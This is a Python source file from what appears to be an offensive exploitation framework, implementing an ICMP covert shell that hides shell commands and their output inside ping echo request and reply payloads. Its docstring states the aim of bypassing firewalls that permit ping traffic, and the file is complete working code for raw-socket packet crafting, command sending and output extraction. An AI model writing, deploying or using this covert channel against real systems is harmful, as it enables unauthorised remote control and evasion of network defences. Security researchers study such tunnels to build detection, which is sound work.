"""ICMP covert shell engine.

Tunnels shell I/O inside ICMP Echo Request/Reply payloads, bypassing
firewalls that allow ping traffic but do not perform deep inspection
on ICMP payload content.  Uses raw sockets for ICMP crafting.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import logging
import os
import select
import socket
import struct
import threading
import time
from typing import Optional

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_ICMP_ECHO_REQUEST = 8
_ICMP_ECHO_REPLY = 0
_ICMP_HDR_FMT = "!BBHHH"
_ICMP_HDR_SIZE = struct.calcsize(_ICMP_HDR_FMT)
_MAX_PAYLOAD = 1400
_MAGIC = 0xE5F1
_DEFAULT_ICMP_ID = 0x4578


class ICMPCovertShell(ShellEngine):
    """Shell tunneled through ICMP echo request/reply payloads.

    Commands and output are embedded in the data portion of ICMP packets.
    A 2-byte magic marker at the start of the payload distinguishes
    shell traffic from ordinary pings.

    Payload format::

        [magic:2][seq:2][payload:N]

    The engine sends ICMP Echo Requests carrying commands and reads
    Echo Replies carrying output.  Requires raw socket privileges
    (root/Administrator or CAP_NET_RAW).

    Args:
        remote_host: Target IP.
        remote_port: Unused for ICMP; kept at 0 for API consistency.
        timeout: Receive timeout in seconds.
        icmp_id: ICMP identifier field (helps filter own traffic).
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int = 0,
        timeout: float = 30.0,
        icmp_id: int = _DEFAULT_ICMP_ID,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="icmp_covert",
            timeout=timeout,
        )
        self._icmp_id: int = icmp_id & 0xFFFF
        self._seq: int = 0
        self._sock: Optional[socket.socket] = None
        self._lock: threading.Lock = threading.Lock()

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Open a raw ICMP socket.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: If raw socket creation fails (usually
                a privilege issue).
        """
        self._set_status(ShellStatus.CONNECTING)
        try:
            sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
            )
            sock.settimeout(self._timeout)
            self._sock = sock
            self._set_status(ShellStatus.CONNECTED)
            logger.info(
                "ICMP covert shell ready for %s (id=0x%04X)",
                self._remote_host,
                self._icmp_id,
            )
            return True
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(
                "Raw ICMP socket failed (need root/CAP_NET_RAW): {}".format(exc)
            ) from exc

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Embed a command in an ICMP Echo Request payload.

        Args:
            cmd: Command string.

        Returns:
            Number of payload bytes sent.

        Raises:
            ShellIOError: On send failure.
        """
        self._require_connected()
        payload = cmd.encode("utf-8", errors="replace")
        if not payload.endswith(b"\n"):
            payload += b"\n"

        total = 0
        offset = 0
        while offset < len(payload):
            chunk = payload[offset : offset + _MAX_PAYLOAD]
            offset += len(chunk)
            seq = self._next_seq()
            icmp_payload = struct.pack("!HH", _MAGIC, seq) + chunk
            pkt = self._build_echo_request(seq, icmp_payload)
            try:
                self._sock.sendto(pkt, (self._remote_host, 0))  # type: ignore[union-attr]
                total += len(chunk)
            except OSError as exc:
                self._set_status(ShellStatus.ERROR, str(exc))
                raise ShellIOError(str(exc)) from exc

        return total

    def recv(self, timeout: Optional[float] = None) -> str:
        """Receive covert data from ICMP Echo Replies.

        Filters incoming ICMP traffic by type, identifier, and magic
        marker, discarding unrelated packets.

        Args:
            timeout: Override default timeout.

        Returns:
            Decoded output string (empty on timeout).

        Raises:
            ShellIOError: On socket errors.
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        deadline = time.monotonic() + wait
        buf = bytearray()

        while time.monotonic() < deadline:
            remaining = max(0.0, deadline - time.monotonic())
            ready, _, _ = select.select([self._sock], [], [], min(remaining, 0.5))
            if not ready:
                if buf:
                    break
                continue

            try:
                data, addr = self._sock.recvfrom(65535)  # type: ignore[union-attr]
            except socket.timeout:
                break
            except OSError as exc:
                self._set_status(ShellStatus.ERROR, str(exc))
                raise ShellIOError(str(exc)) from exc

            extracted = self._extract_reply(data, addr[0])
            if extracted is not None:
                buf.extend(extracted)

        return buf.decode("utf-8", errors="replace")

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Close the raw ICMP socket."""
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("ICMPCovertShell closed")

    def is_alive(self) -> bool:
        """Check socket availability."""
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            return False
        return self._sock.fileno() != -1

    # ------------------------------------------------------------------
    # ICMP helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _checksum(data: bytes) -> int:
        """Compute the ICMP checksum (RFC 1071 one's complement sum)."""
        if len(data) % 2:
            data += b"\x00"
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i + 1]
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        return (~total) & 0xFFFF

    def _build_echo_request(self, seq: int, payload: bytes) -> bytes:
        """Construct a complete ICMP Echo Request packet.

        Args:
            seq: Sequence number.
            payload: Raw payload bytes.

        Returns:
            Assembled ICMP packet with valid checksum.
        """
        hdr = struct.pack(
            _ICMP_HDR_FMT,
            _ICMP_ECHO_REQUEST,
            0,
            0,
            self._icmp_id,
            seq & 0xFFFF,
        )
        chksum = self._checksum(hdr + payload)
        hdr = struct.pack(
            _ICMP_HDR_FMT,
            _ICMP_ECHO_REQUEST,
            0,
            chksum,
            self._icmp_id,
            seq & 0xFFFF,
        )
        return hdr + payload

    def _extract_reply(self, raw: bytes, src_ip: str) -> Optional[bytes]:
        """Extract covert payload from an ICMP Echo Reply.

        Validates source, type, identifier, and magic marker.

        Args:
            raw: Raw IP+ICMP packet bytes.
            src_ip: Source IP from recvfrom.

        Returns:
            Payload bytes or None if the packet is not ours.
        """
        if src_ip != self._remote_host:
            return None

        ip_hdr_len = (raw[0] & 0x0F) * 4
        icmp_data = raw[ip_hdr_len:]
        if len(icmp_data) < _ICMP_HDR_SIZE + 4:
            return None

        icmp_type, _, _, pkt_id, _ = struct.unpack_from(_ICMP_HDR_FMT, icmp_data)
        if icmp_type != _ICMP_ECHO_REPLY:
            return None
        if pkt_id != self._icmp_id:
            return None

        payload = icmp_data[_ICMP_HDR_SIZE:]
        if len(payload) < 4:
            return None

        magic, _ = struct.unpack_from("!HH", payload)
        if magic != _MAGIC:
            return None

        return payload[4:]

    def _next_seq(self) -> int:
        with self._lock:
            s = self._seq
            self._seq = (self._seq + 1) & 0xFFFF
        return s

    def _require_connected(self) -> None:
        if self._status != ShellStatus.CONNECTED or self._sock is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
